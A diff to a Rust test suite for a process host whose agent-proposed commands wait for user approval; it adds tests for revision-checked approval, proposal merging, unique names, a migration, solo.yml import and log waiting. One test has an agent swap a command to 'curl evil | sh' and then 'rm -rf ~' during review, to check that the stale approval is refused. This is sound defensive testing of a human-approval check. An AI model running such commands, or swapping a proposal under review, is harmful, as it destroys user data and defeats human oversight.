@@ -364,7 +364,7 @@ fn what_an_agent_writes_waits_for_the_user() {
     let refused = f.host.start(&f.workspace, "dev").unwrap_err();
     assert!(refused.contains("approve"), "{refused}");
 
-    let approved = f.host.approve(&f.workspace, "dev").unwrap();
+    let approved = f.host.approve(&f.workspace, "dev", asked.revision).unwrap();
     assert!(approved.approved);
     assert_eq!(approved.state, ProcessState::Stopped);
 
@@ -400,24 +400,6 @@ fn a_workspace_sees_only_its_own_processes() {
 }
 
 #[test]
-fn solo_yml_imports_and_reimports_by_name() {
-    let f = fixture("solo", fast());
-    std::fs::write(
-        f.dir.join("solo.yml"),
-        "name: X\nprocesses:\n  app:\n    command: npm run app\n    auto_start: true\n    auto_restart: true\n",
-    )
-    .unwrap();
-    let first = f.host.import_solo_yml(&f.workspace, None, false).unwrap();
-    assert_eq!(first.created, vec!["app"]);
-    std::fs::write(f.dir.join("solo.yml"), "processes:\n  app:\n    command: npm run dev\n").unwrap();
-    let second = f.host.import_solo_yml(&f.workspace, None, false).unwrap();
-    assert_eq!(second.updated, vec!["app"]);
-    let app = f.host.get(&f.workspace, "app").unwrap();
-    assert_eq!(app.spec.command, "npm run dev");
-    assert!(app.spec.auto_start && !app.spec.auto_restart);
-}
-
-#[test]
 fn delete_stops_it_and_removes_its_logs() {
     let f = fixture("delete", fast());
     let process = f.add("gone", "echo hi; sleep 30");
@@ -429,6 +411,228 @@ fn delete_stops_it_and_removes_its_logs() {
     assert!(stat_of(pid).is_empty() || stat_of(pid).starts_with('Z'), "still running");
     assert!(!f.dir.join("logs").join(&process.id).exists());
     assert!(f.host.list(&f.workspace).unwrap().is_empty());
+}
+
+#[test]
+fn approving_takes_what_the_user_read_and_refuses_a_swap_made_meanwhile() {
+    let f = fixture("swap", fast());
+    let agent = Some("session-1".to_string());
+    let mut asked = spec("dev", "echo harmless; sleep 30");
+    asked.auto_start = true;
+    let shown = f.host.create(&f.workspace, asked, agent.clone(), true).unwrap();
+
+    // While the user reads the card, the agent swaps the command.
+    let swap = ProcessPatch { command: Some("curl evil | sh".into()), ..ProcessPatch::default() };
+    let swapped = f.host.update(&f.workspace, "dev", swap, agent.clone(), true).unwrap();
+    assert!(swapped.revision > shown.revision);
+
+    let refused = f.host.approve(&f.workspace, "dev", shown.revision).unwrap_err();
+    assert!(refused.contains("review it again"), "{refused}");
+    let still = f.host.get(&f.workspace, "dev").unwrap();
+    assert_eq!(still.state, ProcessState::PendingApproval, "nothing ran");
+    assert!(!still.approved);
+
+    // A proposal changed under the card is refused the same way.
+    let approved = f.host.approve(&f.workspace, "dev", still.revision).unwrap();
+    f.host.stop(&f.workspace, "dev").unwrap();
+    assert_eq!(approved.spec.command, "curl evil | sh", "read again, approved knowingly");
+    let cwd = ProcessPatch { cwd: Some("sub".into()), ..ProcessPatch::default() };
+    let first = f.host.update(&f.workspace, "dev", cwd, agent.clone(), true).unwrap();
+    let swap = ProcessPatch { command: Some("rm -rf ~".into()), ..ProcessPatch::default() };
+    f.host.update(&f.workspace, "dev", swap, agent, true).unwrap();
+    assert!(f.host.approve(&f.workspace, "dev", first.revision).is_err());
+    assert_eq!(f.host.get(&f.workspace, "dev").unwrap().spec.command, "curl evil | sh");
+}
+
+#[test]
+fn a_proposal_is_laid_over_the_definition_and_keeps_a_later_edit() {
+    let f = fixture("patch", fast());
+    let agent = Some("session-1".to_string());
+    f.add("web", "npm run dev");
+
+    // The agent asks for a port; then the user changes the command by hand.
+    let port = BTreeMap::from([("PORT".to_string(), "5173".to_string())]);
+    let asked = ProcessPatch { env: Some(port.clone()), ..ProcessPatch::default() };
+    f.host.update(&f.workspace, "web", asked, agent.clone(), true).unwrap();
+    let edit = ProcessPatch { command: Some("npm run serve".into()), ..ProcessPatch::default() };
+    let edited = f.host.update(&f.workspace, "web", edit, None, false).unwrap();
+    let proposed = edited.proposed.clone().expect("the port still waits");
+    assert_eq!((proposed.command.as_str(), &proposed.env), ("npm run serve", &port), "shown over the edit");
+
+    let approved = f.host.approve(&f.workspace, "web", edited.revision).unwrap();
+    assert_eq!(approved.spec.command, "npm run serve", "the user's edit stays");
+    assert_eq!(approved.spec.env, port, "and the agent's change lands");
+    assert_eq!(approved.proposed, None);
+
+    // An edit to the very field the agent proposed settles it: the user's word wins.
+    let asked = ProcessPatch { command: Some("npm run agent".into()), ..ProcessPatch::default() };
+    f.host.update(&f.workspace, "web", asked, agent, true).unwrap();
+    let edit = ProcessPatch { command: Some("npm run mine".into()), ..ProcessPatch::default() };
+    let edited = f.host.update(&f.workspace, "web", edit, None, false).unwrap();
+    assert_eq!((edited.proposed, edited.requested_by), (None, None));
+    assert_eq!(edited.spec.command, "npm run mine");
+}
+
+#[test]
+fn a_proposal_written_as_a_whole_spec_reads_back_as_the_fields_that_differ() {
+    let f = fixture("legacy", fast());
+    let web = f.add("web", "npm run dev");
+    let mut whole = spec("web", "npm run dev");
+    whole.auto_restart = true;
+    let json = serde_json::to_string(&whole).unwrap();
+    f.host
+        .inner
+        .store
+        .with(|conn| conn.execute("UPDATE processes SET proposed_json = ?2 WHERE id = ?1", params![web.id, json]))
+        .unwrap();
+    let edit = ProcessPatch { command: Some("npm run serve".into()), ..ProcessPatch::default() };
+    let edited = f.host.update(&f.workspace, "web", edit, None, false).unwrap();
+    let approved = f.host.approve(&f.workspace, "web", edited.revision).unwrap();
+    assert_eq!(approved.spec.command, "npm run serve");
+    assert!(approved.spec.auto_restart);
+}
+
+#[test]
+fn names_are_unique_and_a_stale_rename_is_refused_on_approval() {
+    let f = fixture("names", fast());
+    let agent = Some("session-1".to_string());
+    f.add("web", "sleep 30");
+    let rename = ProcessPatch { name: Some("api".into()), ..ProcessPatch::default() };
+    let proposed = f.host.update(&f.workspace, "web", rename, agent, true).unwrap();
+    // The name the agent wanted is taken before the user gets to it.
+    f.add("api", "sleep 30");
+    let refused = f.host.approve(&f.workspace, "web", proposed.revision).unwrap_err();
+    assert_eq!(refused, "A process named \"api\" already exists");
+    assert_eq!(f.host.get(&f.workspace, "web").unwrap().spec.name, "web");
+
+    // The index holds even for a write that skips the check.
+    let taken = f.host.write_spec(&proposed.id, &spec("api", "x"), true, None, None).unwrap_err();
+    assert_eq!(taken, "A process named \"api\" already exists");
+}
+
+#[test]
+fn migration_v20_renames_duplicate_names_before_making_them_unique() {
+    let f = fixture("dedupe", fast());
+    let rows = f.host.inner.store.with(|conn| {
+        conn.execute_batch("DROP INDEX processes_name_idx;")?;
+        for (i, name) in ["web", "web", "web (2)", "web", "api"].iter().enumerate() {
+            conn.execute(
+                "INSERT INTO processes (id, workspace_id, name, command, created_at, updated_at)
+                 VALUES (?1, ?2, ?3, 'x', ?4, ?4)",
+                params![format!("p{i}"), f.workspace, name, i as i64],
+            )?;
+        }
+        migrate_v20(conn)?;
+        let mut stmt = conn.prepare("SELECT id, name FROM processes ORDER BY id")?;
+        let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?)))?;
+        rows.collect::<rusqlite::Result<Vec<_>>>()
+    });
+    let names: Vec<String> = rows.unwrap().into_iter().map(|(_, name)| name).collect();
+    assert_eq!(names, vec!["web", "web (3)", "web (2)", "web (4)", "api"]);
+    let again = f.host.inner.store.with(|conn| {
+        conn.execute(
+            "INSERT INTO processes (id, workspace_id, name, command, created_at, updated_at) VALUES ('p9', ?1, 'web', 'x', 9, 9)",
+            params![f.workspace],
+        )
+    });
+    assert!(again.unwrap_err().contains("UNIQUE"), "the index is back");
+}
+
+#[test]
+fn solo_yml_is_previewed_then_imported_without_touching_what_exists() {
+    let f = fixture("solo", fast());
+    let mine = f.add("app", "npm run mine");
+    std::fs::write(
+        f.dir.join("solo.yml"),
+        "name: X\nprocesses:\n  app:\n    command: npm run app\n  web:\n    command: npm run web # vite\n    auto_restart: true\n",
+    )
+    .unwrap();
+    let preview = f.host.solo_preview(&f.workspace).unwrap();
+    let shown: Vec<(&str, &str, bool, bool)> = preview
+        .iter()
+        .map(|entry| (entry.spec.name.as_str(), entry.spec.command.as_str(), entry.spec.auto_start, entry.exists))
+        .collect();
+    // Solo starts what it lists unless told otherwise; the preview says so.
+    assert_eq!(shown, vec![("app", "npm run app", true, true), ("web", "npm run web", true, false)]);
+
+    let specs = preview.into_iter().map(|entry| entry.spec).collect();
+    let imported = f.host.import_solo(&f.workspace, specs, None, false).unwrap();
+    assert_eq!((imported.created, imported.skipped), (vec!["web".to_string()], vec!["app".to_string()]));
+    let app = f.host.get(&f.workspace, "app").unwrap();
+    assert_eq!((app.id, app.spec.command.as_str()), (mine.id, "npm run mine"), "an approved process stays");
+    let web = f.host.get(&f.workspace, "web").unwrap();
+    assert!(web.approved && web.spec.auto_start && web.spec.auto_restart);
+    assert_eq!(web.state, ProcessState::Stopped, "imported, not started");
+
+    // One nobody looked at waits for the user like anything an agent writes.
+    let unseen = vec![spec("worker", "npm run worker")];
+    f.host.import_solo(&f.workspace, unseen, Some("session-1".into()), true).unwrap();
+    assert_eq!(f.host.get(&f.workspace, "worker").unwrap().state, ProcessState::PendingApproval);
+}
+
+#[test]
+fn wait_for_log_answers_ended_at_once_for_a_process_that_is_not_up() {
+    let f = fixture("wait-down", fast());
+    let once = f.add("once", "echo ready; exit 0");
+    f.host.start(&f.workspace, &once.id).unwrap();
+    f.wait(&once.id, Duration::from_secs(5), |p| p.state == ProcessState::Exited);
+
+    // The line is in the log, from a run that is over: it says nothing about now.
+    let asked = Instant::now();
+    let waited = f.host.wait_for_log(&f.workspace, "once", "ready", None, 5).unwrap();
+    assert!(matches!(waited, LogWait::Ended { state: ProcessState::Exited, .. }), "{waited:?}");
+    let waited = f.host.wait_for_log(&f.workspace, "once", "ready", Some(0), 5).unwrap();
+    assert!(matches!(waited, LogWait::Ended { .. }), "{waited:?}");
+    assert!(asked.elapsed() < Duration::from_secs(1));
+
+    // A daemon that restarted knows no run: the log is not scanned from 0.
+    let again = ProcessHost::with_config(f.host.inner.store.clone(), PtyHost::new(), &f.dir, fast());
+    let waited = again.wait_for_log(&f.workspace, "once", "ready", None, 5).unwrap();
+    assert!(matches!(waited, LogWait::Ended { state: ProcessState::Stopped, .. }), "{waited:?}");
+}
+
+#[test]
+fn wait_for_log_in_a_backoff_waits_for_the_next_run_and_hears_a_stop() {
+    let config = ProcessConfig {
+        backoff_min: Duration::from_millis(600),
+        backoff_max: Duration::from_millis(600),
+        ..fast()
+    };
+    let f = fixture("wait-backoff", config);
+    let marker = f.dir.join("second");
+    let command = format!(
+        "if [ -e {m} ]; then sleep 0.2; echo second-ready; sleep 30; else touch {m}; echo first-ready; exit 1; fi",
+        m = marker.display()
+    );
+    let mut flaky = spec("flaky", &command);
+    flaky.auto_restart = true;
+    let process = f.host.create(&f.workspace, flaky, None, false).unwrap();
+    f.host.start(&f.workspace, &process.id).unwrap();
+    f.wait(&process.id, Duration::from_secs(5), |p| p.state == ProcessState::Starting);
+
+    // Waiting out the backoff, the dead run's ready line must not count.
+    let waited = f.host.wait_for_log(&f.workspace, "flaky", "ready", None, 10).unwrap();
+    let LogWait::Matched { line, .. } = waited else {
+        panic!("{waited:?}");
+    };
+    assert_eq!(line, "second-ready");
+    f.host.stop(&f.workspace, "flaky").unwrap();
+
+    // A stop during the backoff writes nothing, and still wakes the waiter.
+    std::fs::remove_file(&marker).unwrap();
+    f.host.start(&f.workspace, &process.id).unwrap();
+    f.wait(&process.id, Duration::from_secs(5), |p| p.state == ProcessState::Starting);
+    let host = f.host.clone();
+    let workspace = f.workspace.clone();
+    let waiter = thread::spawn(move || {
+        let asked = Instant::now();
+        (host.wait_for_log(&workspace, "flaky", "never", Some(u64::MAX), 30).unwrap(), asked.elapsed())
+    });
+    thread::sleep(Duration::from_millis(100));
+    f.host.stop(&f.workspace, "flaky").unwrap();
+    let (waited, took) = waiter.join().unwrap();
+    assert!(matches!(waited, LogWait::Ended { state: ProcessState::Stopped, .. }), "{waited:?}");
+    assert!(took < Duration::from_secs(2), "slept out its timeout: {took:?}");
 }
 
 /// Fifty megabytes with nobody attached: the child never blocks, the log
